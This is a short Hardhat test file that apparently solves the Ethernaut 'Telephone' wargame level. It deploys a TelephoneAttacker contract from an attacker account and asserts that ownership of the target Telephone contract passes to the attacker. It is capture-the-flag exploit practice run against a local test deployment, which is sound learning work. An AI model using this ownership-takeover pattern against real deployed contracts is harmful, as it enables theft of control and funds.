import { expect } from "chai";
import { ethers } from "hardhat";

describe("Telephone", async function () {

  it("Should claim ownership", async function () {
    //+setup
    const [deployer, attacker] = await ethers.getSigners()
    const Telephone = await ethers.getContractFactory("Telephone");
    const telephone = await Telephone.deploy();
    await telephone.deployed();
    //-setup

    //1. Deploy TelephoneAttacker
    const TelephoneAttacker = await ethers.getContractFactory("TelephoneAttacker");
    const telephoneAttacker = await TelephoneAttacker.connect(attacker).deploy(telephone.address);
    await telephoneAttacker.deployed();


    //2.Call TelephoneAttacker to change the owner
    await telephoneAttacker.callChangeOwner()

    expect(await telephone.owner()).to.eq(attacker.address)

  });
});